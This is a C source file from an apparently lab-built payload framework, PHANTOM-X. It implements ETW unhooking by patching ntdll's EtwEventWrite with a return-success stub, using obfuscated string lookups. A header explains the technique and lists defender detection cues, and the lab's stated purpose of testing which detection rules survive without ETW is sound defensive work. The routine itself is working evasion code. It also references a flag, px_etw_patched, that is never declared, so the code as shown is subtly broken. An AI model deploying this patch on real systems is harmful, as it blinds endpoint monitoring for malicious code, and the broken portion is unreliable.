/* ================================================================== */
/* PHANTOM-X :: ETW unhooking variant                                  */
/* ================================================================== */
/*                                                                        */
/* WHAT IT DOES                                                          */
/*     ETW (Event Tracing for Windows) is the kernel mechanism behind   */
/*     most of the telemetry Windows produces. Sysmon is an ETW         */
/*     provider. So is a great deal of what an EDR sees.                */
/*                                                                        */
/*     This variant stops the payload's events from reaching ETW by    */
/*     patching EtwEventWrite inside ntdll.dll so that it returns      */
/*     immediately without doing anything.                              */
/*                                                                        */
/* THE TECHNIQUE                                                         */
/*     ntdll.dll exports EtwEventWrite. Its prologue can be replaced    */
/*     with a stub that returns success without tracing anything:       */
/*                                                                        */
/*         xor eax, eax     ; EAX = 0 (STATUS_SUCCESS)                  */
/*         ret                                                           */
/*                                                                        */
/*     The same two bytes as the AMSI variant, applied to a different   */
/*     function. This technique has been publicly documented for years.  */
/*                                                                        */
/* WHY IT IS HERE                                                        */
/*     This is the most important variant in the lab, and the reason is */
/*     uncomfortable:                                                 */
/*                                                                        */
/*     If the lab's own detections only work because ETW is intact,     */
/*     then those detections are fragile. A defender who is paged by   */
/*     a noisy ETW-driven rule is relying on a mechanism that an        */
/*     adversary can turn off with two bytes.                            */
/*                                                                        */
/*     Running the unhooked arm shows which rules survive without ETW   */
/*     and which ones were riding on it. The rules that survive are the */
/*     ones worth having.                                              */
/*                                                                        */
/* DETECTION NOTES                                                       */
/*     ETW unhooking is detectable independently of ETW itself, which   */
/*     is the interesting part:                                       */
/*                                                                        */
/*       1. The patched ntdll page becomes writable+executable.        */
/*       2. EtwEventWrite's prologue no longer matches the module on   */
/*          disk. A module integrity check catches it.                  */
/*       3. Defender's own "ETW tampering" detection fires -- it does  */
/*          not rely on the ETW stream it is monitoring.                */
/*                                                                        */
/*     And the payload is still caught by the non-ETW telemetry: the   */
/*     process creation, the memory allocation, the network connection. */
/*                                                                        */
/* SCOPE                                                                  */
/*     In the payload's own process only. It is not persistent: the     */
/*     patch lasts exactly as long as the payload runs.                 */
/* ================================================================== */

#include "px_config.h"

#if PX_ETW_UNHOOK

#include "px_strings.h"
#include "px_obfuscate.h"

/* xor eax, eax ; ret -> STATUS_SUCCESS without tracing. */
static const unsigned char px_etw_stub[] = { 0x31, 0xC0, 0xC3 };

/* Whether the ETW unhook actually took. The capability library
 * reports it, so a run can say whether its own evasion worked. */
/* Unhook ETW.
 *
 * Returns 1 on success, 0 on failure. Failure is not fatal: the payload
 * still runs and is still visible to ETW, and the lab wants to see that
 * difference rather than have the payload die. */
int px_etw_unhook(void)
{
    char dll_name[64];
    char func_name[64];
    HMODULE ntdll;
    void *fn;
    unsigned char *prologue;
    DWORD old_protect = 0;

    px_obf_decode(PX_SID_NTDLL, dll_name, sizeof(dll_name));
    px_obf_decode(PX_SID_ETW_WRITE, func_name, sizeof(func_name));

    /* ntdll.dll is always loaded in every Windows process, so
     * GetModuleHandleA is used rather than LoadLibraryA. */
    ntdll = GetModuleHandleA(dll_name);
    if (!ntdll)
        return 0;

    fn = GetProcAddress(ntdll, func_name);
    if (!fn)
        return 0;

    prologue = (unsigned char *)fn;

    if (!VirtualProtect(prologue, sizeof(px_etw_stub),
                        PAGE_EXECUTE_READWRITE, &old_protect))
        return 0;

    memcpy(prologue, px_etw_stub, sizeof(px_etw_stub));

    {
        DWORD ignored;
        VirtualProtect(prologue, sizeof(px_etw_stub), old_protect, &ignored);
    }

    FlushInstructionCache(GetCurrentProcess(), prologue, sizeof(px_etw_stub));
    px_etw_patched = 1;
    return 1;
}

#else  /* !PX_ETW_UNHOOK */

int px_etw_unhook(void)
{
    /* The baseline arm leaves ETW alone, so the payload produces the
     * same telemetry as any other process. That is what makes it the
     * comparison arm. */
    return 0;
}

#endif /* PX_ETW_UNHOOK */